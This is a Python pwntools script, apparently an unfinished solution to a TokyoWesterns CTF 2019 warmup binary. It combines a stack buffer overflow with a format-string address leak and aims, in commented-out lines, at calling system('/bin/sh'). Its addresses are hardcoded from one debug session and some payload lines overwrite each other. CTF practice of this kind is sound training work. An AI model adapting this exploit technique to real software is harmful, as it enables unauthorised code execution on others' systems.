from pwn import *

code_elf = ELF("/home/shreyansh/Desktop/InfoSec/CTFs/TokyoWesternsCTF2019/nothing_more_to_say/warmup")
# p = process("/home/shreyansh/Desktop/InfoSec/CTFs/TokyoWesternsCTF2019/nothing_more_to_say/warmup")
p = code_elf.process()

context.binary = '/home/shreyansh/Desktop/InfoSec/CTFs/TokyoWesternsCTF2019/nothing_more_to_say/warmup'
context.terminal = ['terminator', '-e']

# attach gdb and continue
gdb.attach(p.pid, '''c''')
# libc
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

# libc = 0x7f864628c000
system_addr = 0x7ffff7a52390
libc_base = 0x00007ffff7a2c8b0
system_offset = 0x25ae0
format_string_offset = 0x3a6ed0
buffer = 0x7fff0ae67100
main = 0x004006ba
main2 = 0x00007ffde8a82c28
# payload = cyclic(300)
x = cyclic_find("qaacraacsaactaacuaacvaacwaacxaacyaac")
offset = 264

payload = "/bin/sh\x00"
payload = "%4$p"
payload += "A"*(offset-4)    #"A"*(offset-4)
payload += p64(main2)


# payload = "/bin/sh\x00"
# payload += "A"*(offset-8)
# payload += "BBBBBBBB"


# payload = "/bin/sh\x00"
# payload += "A"*(offset-6)
# # payload += "BBBBBBBB"
# print(p64(libc_base + system_offset))

# payload += p64(libc_base + system_offset)
# payload += "CCCCCCCC"
# payload += p64(buffer)
p.clean()
p.sendline(payload)
# format_addr = p.readline()
# print(format_addr)
p.interactive()